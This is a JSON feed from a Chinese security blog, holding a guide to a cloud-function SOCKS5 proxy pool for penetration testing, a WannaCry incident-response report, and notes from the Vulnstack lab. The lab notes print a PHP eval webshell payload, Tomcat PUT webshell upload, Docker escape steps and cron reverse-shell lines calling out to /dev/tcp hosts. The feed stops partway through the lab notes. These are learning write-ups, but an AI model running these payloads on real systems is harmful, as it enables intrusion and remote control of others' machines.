{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2022/01/04/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/",
            "url": "http://blog.m1n.me/2022/01/04/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/",
            "title": "利用云函数搭建socks5代理",
            "date_published": "2022-01-04T08:29:12.000Z",
            "content_html": "<p>记录一下如何用云函数搭建 socks 代理池，用于 hw 或渗透测试</p>\n<span id=\"more\"></span>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h2>\n<ol>\n<li>\n<p>可以搭建 http、https、socks 代理，这里选择 socks 代理比较方便，适用更多协议，也不需要配置证书即可适配 https</p>\n</li>\n<li>\n<p>因为云函数最长超时时间为 15 分钟，所以 socks 连接最长持续 15 分钟，超时需重连</p>\n</li>\n<li>\n<p>每个月都有免费额度，用完可以换个账户或者可以买云函数包，也不贵</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041635877.png\" alt=\"image-20211220210818106\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h2 id=\"准备\"><a class=\"markdownIt-Anchor\" href=\"#准备\">#</a> 准备</h2>\n<ol>\n<li>某云账户</li>\n<li>一台 VPS，必须 Linux，这里用的是 Ubuntu20.04</li>\n<li><a href=\"https://github.com/shimmeris/SCFProxy\">https://github.com/shimmeris/SCFProxy</a></li>\n</ol>\n<h2 id=\"配置某云函数\"><a class=\"markdownIt-Anchor\" href=\"#配置某云函数\">#</a> 配置某云函数</h2>\n<ol>\n<li>\n<p>云函数地址 https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default，第一次使用需要授权</p>\n</li>\n<li>\n<p>选择自定义创建、事件函数、代码部署、python3.6</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041637887.png\" alt=\"image-20211220211419782\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>先下载项目，把 / SCFProxy/SOCKS5/src/server.py 复制过来，IP 填 VPS 的 IP，端口自选 (记得开放，可以先 nc 监听一下是否能通)</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041637541.png\" alt=\"image-20211220211629211\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>高级配置，超时时间填最大</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638497.png\" alt=\"image-20211220211901488\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>记得选公网访问（默认），别选固定出口 IP</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638342.png\" alt=\"image-20211220211947391\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>配置好触发器选择 API 网关触发</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638687.png\" alt=\"image-20211220212201492\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>复制好触发器的访问路径</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638410.png\" alt=\"image-20211220212336201\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h2 id=\"配置vps\"><a class=\"markdownIt-Anchor\" href=\"#配置vps\">#</a> 配置 VPS</h2>\n<ol>\n<li>环境需要 python3.8 及以上，版本过低需要升级，Ubuntu18.04 可以参考 (<a href=\"https://app.yinxiang.com/fx/94afdeae-41b2-4854-8762-dc08f9b1feb3\">https://app.yinxiang.com/fx/94afdeae-41b2-4854-8762-dc08f9b1feb3</a>)</li>\n<li><code>git clone https://github.com/shimmeris/SCFProxy.git</code></li>\n<li><code>cd ./SCFProxy/SOCKS5</code></li>\n<li><code>pip3 install -r requirements.txt</code></li>\n<li><code>cd ./src/socks_client</code></li>\n<li>VPS 上运行 <code>python3 socks5.py -u &quot;触发器URL&quot; -bp 4455 -sp 4466 --user m1n --passwd m1n</code>  注意这里的 4455 是云函数代码里配置的那个端口，4466 是接下来配置 socks 代理的端口</li>\n</ol>\n<h2 id=\"起飞~\"><a class=\"markdownIt-Anchor\" href=\"#起飞~\">#</a> 起飞～</h2>\n<p>因为浏览器貌似不支持 socks 的账号认证，这边让 burp 走 socks 代理，浏览器走 burp 代理</p>\n<ol>\n<li>\n<p>配置 burp，在 user options 处配置</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638149.png\" alt=\"image-20211220215822772\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>浏览器正常走 burp 代理即可，可以看到 IP 已经是经过代理的 IP</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638948.png\" alt=\"image-20211220215931018\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h2 id=\"倒霉的踩坑记录院长\"><a class=\"markdownIt-Anchor\" href=\"#倒霉的踩坑记录院长\">#</a> 倒霉的踩坑记录 (@院长)</h2>\n<h3 id=\"ubuntupython369\"><a class=\"markdownIt-Anchor\" href=\"#ubuntupython369\">#</a> ubuntu+python3.6.9</h3>\n<p>这是腾讯云 ubuntu 默认环境，自带 python3.6.9 环境，且于操作系统绑定，系统依赖于 python3.6.9，最开始用的 3.6.9 版本的 python 安装工具，一直到安装依赖的时候发现报错，找不到对应的版本  <code>pip3 install -r requirements.txt</code>  这一步报错，报错截图当时没有存。</p>\n<h3 id=\"ubuntupython381\"><a class=\"markdownIt-Anchor\" href=\"#ubuntupython381\">#</a> ubuntu+python3.8.1</h3>\n<p>这里发现问题后就去装了新版的 python，装了 3.8.1，原工具说明里明确说了要 3.8 及以上版本的 python3，新装的 python 环境变量设为了 python3, 这时米有卸载原先自带的 3.6.9，在保留旧版本的基础上将 python3 的优先级指向了 3.8.1，这一步设置未存记录，可自行百度，不复杂，就写下配置文件即可，但是到了安装依赖这一步还是一样的报错，这里和先前的报错一模一样，一开始怀疑是 pip3 的环境变量没有设，但是测试之后发现 pip3 也是新的</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041638871.png\" alt=\"image-20220104163441257\" class=\"lazyload\"></p>\n<p>卸了 3.8.1 重装了一次，还是不行，于是气急败坏把旧版本的 3.6.9 卸载了，卸载之后又装了一次依赖，依然不行，这时候然后搞笑的事情就来了，apt-get 用不了了，还有一些其他命令都无法使用，一用就报错，好家伙，系统崩了（截图没存），没有办法，只能重置 vps，因为这台 vps 本来就没怎么装东西，所以还好，损失不大。</p>\n<h3 id=\"ubantu-python381环境变量python38\"><a class=\"markdownIt-Anchor\" href=\"#ubantu-python381环境变量python38\">#</a> ubantu + python3.8.1 (环境变量 python3.8)</h3>\n<p>这里重置了 vps 之后，因为之前的环境是直接通过 apt-get 直接安装的 3.8.1，在装依赖的时候报错内容和 3.6.9 一模一样，怀疑环境变量冲突问题，于是转变思维，单独给 3.8.1 开一个环境变量，并且不通过 apt 安装，apt 安装会自动覆盖环境，所以这里选择了用源码编译的方法安装，具体可以百度，我这里安装完之后 python3.8.1 的环境变量是 python3.8，pip 也是 pip3.8，在这次安装依赖的时候终于一路顺风安装完，没有报错，然后在运行工具的时候报错了，最后查明是工具的命令参数写错了，这个由于当时找的教程最后运行部分的参数是错的导致我在这一步卡了很久，最后请教了同事解决的。</p>\n<h3 id=\"综上所述\"><a class=\"markdownIt-Anchor\" href=\"#综上所述\">#</a> 综上所述</h3>\n<p>这次也是吃到了 apt 的亏吧，平常用 apt 安装软件都习惯了，但是对于环境这类的东西非必要的情况下还是直接用源码编译的方式会好些，像 python 有多版本共存的需求的情况时，就可以用源码编译的方式。这里时 ubuntu 有 python 依赖，所以不能卸载 3.6.9，这也是学到了。在排查的过程中了解到同事用的 centos，于是自己在虚拟机里也试了 centos，过程很流畅，也许是没有自带 python 环境的原因，没有细察。</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2022/01/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "url": "http://blog.m1n.me/2022/01/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "title": "记一次简单的蠕虫病毒事件应急响应",
            "date_published": "2022-01-04T08:16:05.000Z",
            "content_html": "<h2 id=\"背景描述\"><a class=\"markdownIt-Anchor\" href=\"#背景描述\">#</a> 背景描述</h2>\n<p>某日接到某省政务外网安全监管平台通报，某单位的一个 IP 发生 Parite 蠕虫病毒活动事件，其对政务外网内其他地市主机发起 SMB 扫描攻击。</p>\n<span id=\"more\"></span>\n<h2 id=\"事件分析处置\"><a class=\"markdownIt-Anchor\" href=\"#事件分析处置\">#</a> 事件分析处置</h2>\n<ol>\n<li>\n<p>与客户沟通，被通报的 IP 为政务网的出口 IP，不属于某一台服务器</p>\n</li>\n<li>\n<p>网络环境中具有上网行为管理系统，通过排查筛选，定位到一共有四台主机向其他主机的 445 端口发送大量请求</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620353.png\" alt=\"image-20211116165756380\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>与客户沟通了解到对应的四台主机为个人 PC，不是服务器，远程登录到其中的一台主机上</p>\n</li>\n<li>\n<p>上机发现客户对接人员很贴心的帮我们用杀毒软件进行了排查</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620817.png\" alt=\"image-20211116165949834\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>可以看到排查到的风险文件为 C:\\Windows\\svchost.exe，参考文章 https://xz.aliyun.com/t/8095#toc-4 可以知道，通常在攻击者使用创建服务来实现权限维持的时候，可以把恶意进程隐藏在 svchost 进程中。</p>\n</li>\n<li>\n<p>通过工具检查端口使用情况，发现进程 ID 为 2824 的程序向外部主机 445 端口发起大量 TCP 请求</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620314.png\" alt=\"image-20211116170723354\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过任务管理器查找对于的进程，发现其服务名为 mssecsvc2.0</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620578.png\" alt=\"image-20211116171005724\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>定位到恶意文件为 C:\\Windows\\mssecsvc.exe 文件</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620248.png\" alt=\"image-20211116171100384\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620281.png\" alt=\"image-20211116171221677\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过搜索引擎收集此恶意文件的相关信息，得到其相关描述：</p>\n<p>mssecsvc.exe 文件为通过利用永恒之蓝漏洞的勒索病毒，原病毒文件 mssecsvc.exe 会释放并执行 tasksche.exe 文件，然后检查 kill switch 域名。之后它会创建 mssecsvc2.0 服务。该服务会使用与初次执行不同的入口点执行 mssecsvc.exe 文件。第二次执行会检查被感染电脑的 IP 地址，并尝试联接到相同子网内每个 IP 地址的 TCP 445 端口。当恶意软件成功攻击并联接到一台电脑时，将会建立联接并传输数据，不断进行扩散攻击。</p>\n</li>\n<li>\n<p>通过排查发现 C:\\Windows 目录下的确存在 tasksche.exe 文件</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620466.png\" alt=\"image-20211116172028785\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过排查如系统账号、启动项、计划任务、服务等攻击者常用于权限维持手段的敏感配置，发现 mssecsvc.exe 运行于 svchost.exe 进程下，这与步骤 4 中的杀毒软件排查相互印证，而运行于 svchost.exe 的行为常见于攻击者通过注册系统服务来实现自启动恶意文件的目的</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620529.png\" alt=\"image-20211116172256162\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>排查系统的自启动服务项，发现确实存在自启动 mssecsvc2.0 服务的服务项</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620000.png\" alt=\"image-20211116172406701\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>结合搜索引擎中关于 mssecsvc.exe 病毒的描述是通过永恒之蓝漏洞进行传播，利用 360NSA 武器库免疫工具对主机是否存在永恒之蓝漏洞进行排查，发现系统存在多个包括永恒之蓝在内的主机漏洞</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620955.png\" alt=\"image-20211116172422895\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>排查主机端口开启状态，发现该主机的 445 端口对外开放</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621402.png\" alt=\"image-20211116172445687\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>通过对主机上的病毒样本进行采样，上传至分析系统进行检测，其主要的恶意行为如下：</p>\n<p>（1）通过创建服务实现自启动，这与步骤 7、8 所排查到的行为相互印证</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621665.png\" alt=\"image-20211116172532390\" class=\"lazyload\"></p>\n<p>（2）<a href=\"http://xn--www-633e.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\">向 www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</a>、104.17.244.81 发送请求</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621059.png\" alt=\"image-20211116172614229\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621514.png\" alt=\"image-20211116172619205\" class=\"lazyload\"></p>\n<p>通过威胁情报可以确定对应 IP、域名为常见勒索病毒对应的恶意域名</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621899.png\" alt=\"image-20211116172640677\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"C:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116172648753.png\" alt=\"image-20211116172648753\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>继续对剩余的三台主机进行排查，发现大致情况都一致</p>\n</li>\n</ol>\n<h2 id=\"排查结论\"><a class=\"markdownIt-Anchor\" href=\"#排查结论\">#</a> 排查结论</h2>\n<p>经过详细检测分析，判断该单位出口 IP 为 xxx.xxx.xxx.xxx 的内网网段中，有四台主机感染了 Wannacry 系列勒索病毒家族的蠕虫病毒。</p>\n<p>此病毒通过利用永恒之蓝漏洞进行感染传播，当某台主机存在永恒之蓝漏洞被攻击感染上病毒后，将变成新的攻击机，对内外网中的其他主机进行攻击达到扩散传播的目的。此行为被政务外网安全监管平台捕获，触发报警。</p>\n<h2 id=\"修复建议\"><a class=\"markdownIt-Anchor\" href=\"#修复建议\">#</a> 修复建议</h2>\n<p>1、 通过安装系统补丁（补丁地址见第 7 点），或 360NSA 武器免疫工具（下载地址：<a href=\"http://dl.360safe.com/nsa/nsatool.exe%EF%BC%89%E4%BF%AE%E5%A4%8D%E2%80%9C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E2%80%9D%E6%BC%8F%E6%B4%9E%E3%80%82\">http://dl.360safe.com/nsa/nsatool.exe）修复 “永恒之蓝” 漏洞。</a></p>\n<p>2、 添加入站规则，建议关闭除业务外不必要的端口 445、135、137、138、139 端口</p>\n<p>3、 断网并对系统全部磁盘进行病毒木马扫描，以清除蠕虫病毒，并观察一段时间，若又发现蠕虫病毒需保存备份重要文件并重装系统。</p>\n<p>4、 开启服务的日志记录功能，及时安装并更新相关补丁。</p>\n<p>5、 对主机系统安装杀毒软件。</p>\n<p>6、 定期查看系统安全日志，并且使用杀毒软件定期对系统进行体检。</p>\n<p>7、 下载补丁地址 <a href=\"http://www.catalog.update.microsoft.com/search.aspx?q=%E8%A1%A5%E4%B8%81%E7%BC%96%E5%8F%B7\">http://www.catalog.update.microsoft.com/search.aspx?q = 补丁编号</a> （根据自己的系统版本在下图中查找补丁编号）</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621577.png\" alt=\"image-20211116172902197\" class=\"lazyload\"></p>\n<h2 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><a href=\"https://xz.aliyun.com/t/8095#toc-4\">https://xz.aliyun.com/t/8095#toc-4</a></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/",
            "url": "http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/",
            "title": "红日靶场(四)笔记",
            "date_published": "2021-11-16T14:22:21.000Z",
            "content_html": "<p>红日靶场四学习记录</p>\n<span id=\"more\"></span>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>因为做的过程中，时间跨度比较大，前半段是打的公司的靶场，后半段自己搭建靶场，故 IP 有所变动。拓扑如下：<br>\n<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png\" alt=\"13\" class=\"lazyload\"></p>\n<p>Ubuntu 用 Docker 跑了三个 Web 服务，一台 Win7 域成员机，一台 Winserver2008 域控</p>\n<h2 id=\"外网打点\"><a class=\"markdownIt-Anchor\" href=\"#外网打点\">#</a> 外网打点</h2>\n<h3 id=\"2001端口struct2\"><a class=\"markdownIt-Anchor\" href=\"#2001端口struct2\">#</a> 2001 端口 Struct2</h3>\n<p>Burp 抓包看到 Struct2 字样，直接工具测试一把梭</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png\" alt=\"\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png\" alt=\"\" class=\"lazyload\"></p>\n<h3 id=\"2002端口tomcat\"><a class=\"markdownIt-Anchor\" href=\"#2002端口tomcat\">#</a> 2002 端口 Tomcat</h3>\n<p>可以参考 https://www.freebuf.com/articles/web/271892.html</p>\n<p>使用 PUT 上传冰蝎马，注意直接上传 <code>/shell.jsp</code>  不行哦</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png\" alt=\"\" class=\"lazyload\"></p>\n<h3 id=\"2003端口phpmyadmin-481\"><a class=\"markdownIt-Anchor\" href=\"#2003端口phpmyadmin-481\">#</a> 2003 端口 phpMyAdmin 4.8.1</h3>\n<p>可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</p>\n<ol>\n<li>\n<p>验证漏洞是否存在</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>使用 SELECT 语句后包含 session 文件来 get shell，写 shell <code>SELECT &quot;&lt;?php phpinfo();file_put_contents('m1n.php', '&lt;?=@eval($_POST[1]);');?&gt;&quot;  </code> ，访问发现 <code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>  出现 phpinfo，用蚁剑连接 m1n.php 即可。</p>\n</li>\n</ol>\n<h2 id=\"docker逃逸2002端口的tomcat\"><a class=\"markdownIt-Anchor\" href=\"#docker逃逸2002端口的tomcat\">#</a> Docker 逃逸（2002 端口的 Tomcat）</h2>\n<h3 id=\"如何判断是否在docker里\"><a class=\"markdownIt-Anchor\" href=\"#如何判断是否在docker里\">#</a> 如何判断是否在 Docker 里</h3>\n<ul>\n<li>检查  <code>/.dockerenv</code>  文件是否存在</li>\n<li>检查  <code>/proc/1/cgroup</code>  内是否包含 Docker 等字符串</li>\n</ul>\n<h3 id=\"尝试dirtycow漏洞逃逸\"><a class=\"markdownIt-Anchor\" href=\"#尝试dirtycow漏洞逃逸\">#</a> 尝试 DirtyCow 漏洞逃逸</h3>\n<ol>\n<li>\n<p>下载 POC：<a href=\"https://github.com/scumjr/dirtycow-vdso\">https://github.com/scumjr/dirtycow-vdso</a></p>\n</li>\n<li>\n<p>编译，上传，监听，运行，没反应，下一个。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class=\"hljs-number\">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"尝试runc容器逃逸漏洞cve-2019-5736\"><a class=\"markdownIt-Anchor\" href=\"#尝试runc容器逃逸漏洞cve-2019-5736\">#</a> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</h3>\n<ol>\n<li>下载 POC：<a href=\"https://github.com/Frichetten/CVE-2019-5736-PoC\">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>\n<li>改 POC，把 payload 那行改成自己 VPS 的 IP</li>\n<li>编译（建议 Linux 环境下） <code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>\n<li>上传文件，监听端口，执行，没反应，下一个。</li>\n</ol>\n<h3 id=\"尝试特权模式逃逸\"><a class=\"markdownIt-Anchor\" href=\"#尝试特权模式逃逸\">#</a> 尝试特权模式逃逸</h3>\n<ol>\n<li>\n<p><code>fdisk -l</code>  查看磁盘</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png\" alt=\"\" class=\"lazyload\"></p>\n</li>\n<li>\n<p>在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">mkdir</span> /m<span class=\"hljs-number\">1</span>n<br><span class=\"hljs-attribute\">mount</span> /dev/sda<span class=\"hljs-number\">1</span> /m<span class=\"hljs-number\">1</span>n<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到宿主机的文件都到了 /m1n 目录下</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png\" alt=\"image-20210816152534150\" class=\"lazyload\"></p>\n</li>\n</ol>\n<h4 id=\"尝试写定时任务来反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#尝试写定时任务来反弹shell\">#</a> 尝试写定时任务来反弹 shell</h4>\n<p>参考：<a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>\n<ol>\n<li>写文件到 <code>/var/spool/cron/crontabs/root</code> ，注意写到 <code>/var/spool/cron/root</code>  不行嗷</li>\n<li>同时注意 root 文件的权限必须为 600</li>\n<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 <code>.sh</code>  文件，然后 <code>chmod +x</code> ，然后调用，不容易出错</li>\n<li>也可以 <code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>\n<li>在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。</li>\n</ol>\n<p><strong>定时任务相关笔记：</strong></p>\n<ol>\n<li>\n<p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>\n<p><code>\\* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</code></p>\n</li>\n<li>\n<p>定时任务查看日志：<a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p>（1）查看系统日志直接： <code>tail -f /var/log/syslog</code></p>\n<p>（2）查看 crontab 日志：</p>\n<p>​\t方法 1</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 修改rsyslog文件，将<span class=\"hljs-regexp\">/etc/</span>rsyslog.d/<span class=\"hljs-number\">50</span>-default.conf 文件中的<span class=\"hljs-comment\">#cron.*前的#删掉；</span><br><span class=\"hljs-number\">2</span>. 重启rsyslog服务service rsyslog restart<br><span class=\"hljs-number\">3</span>. 重启cron服务service cron restart<br></code></pre></td></tr></table></figure>\n<p>​\t方法 2</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. 编辑 <span class=\"hljs-regexp\">/etc/</span>syslog.conf，并且打开以cron.*开始的那行注释。<br><span class=\"hljs-number\">2</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/sysklogd restart<br><span class=\"hljs-number\">3</span>. 运行 <span class=\"hljs-regexp\">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>\n<p>​\t查看 cron 日志</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">1</span>. linux<br>看 <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/cron这个文件就可以，可以用tail -f /</span>var<span class=\"hljs-regexp\">/log/</span>cron观察（或者<span 